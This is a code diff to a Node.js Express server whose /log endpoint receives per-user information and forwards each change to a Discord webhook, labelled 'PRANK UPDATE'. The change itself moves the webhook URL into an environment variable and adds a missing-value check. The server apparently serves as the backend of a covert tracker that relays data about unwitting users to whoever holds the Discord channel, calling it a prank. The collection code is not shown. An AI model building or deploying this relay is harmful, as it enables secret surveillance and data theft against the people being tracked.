@@ -3,10 +3,13 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
-// REPLACE THIS WITH YOUR REAL DISCORD WEBHOOK URL
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN_HERE';
+// Use environment variable from Render (set this in Render dashboard!)
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
 
-// In-memory last data per user (resets on restart, fine for prank)
+if (!DISCORD_WEBHOOK) {
+  console.error('DISCORD_WEBHOOK environment variable is missing!');
+}
+
 const lastData = {};
 
 app.post('/log', async (req, res) => {
@@ -35,10 +38,14 @@ app.post('/log', async (req, res) => {
 
     const last = lastData[userID];
     if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
-      await axios.post(DISCORD_WEBHOOK, {
-        content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
-          Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
-      });
+      if (DISCORD_WEBHOOK) {
+        await axios.post(DISCORD_WEBHOOK, {
+          content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
+            Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
+        });
+      } else {
+        console.log('No webhook configured - skipping Discord send');
+      }
     }
 
     lastData[userID] = fullInfo;
